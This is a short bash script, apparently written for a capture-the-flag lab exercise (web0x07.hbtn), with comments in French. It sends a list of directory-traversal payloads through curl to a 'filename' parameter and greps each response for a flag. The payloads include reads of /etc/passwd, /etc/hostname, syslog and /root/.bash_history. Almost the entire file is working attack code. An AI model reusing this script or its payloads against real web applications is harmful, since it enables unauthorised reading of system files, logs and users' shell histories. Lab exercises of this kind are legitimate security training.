#!/bin/bash

# URL de base de l'endpoint
BASE_URL="http://web0x07.hbtn/find_your_shell/"

# Liste des payloads à tester
payloads=(
  "../../../../var/www/html/4-flag.txt"
  "../../../../home/user/4-flag.txt"
  "../../../../etc/passwd"
  "../../../../etc/hostname"
  "../../../../var/log/syslog"
  "../../../../var/backups/flag.bak"
  "../../../../var/tmp/flag.txt"
  "../../../../root/.bash_history"
  "task5_file_hub/README.md"
)

# Fonction pour tester un payload
test_payload() {
    local payload=$1
    response=$(curl -s -X GET "$BASE_URL?filename=$payload")

    # Vérifier si le flag est dans la réponse
    if echo "$response" | grep -q "flag"; then
        echo "Flag trouvé avec le payload: $payload"
        echo "Réponse: $response"
        exit 0
    else
        echo "Aucun flag trouvé avec le payload: $payload"
    fi
}

# Tester chaque payload
for payload in "${payloads[@]}"; do
    test_payload "$payload"
done

echo "Aucun flag trouvé avec les payloads testés."

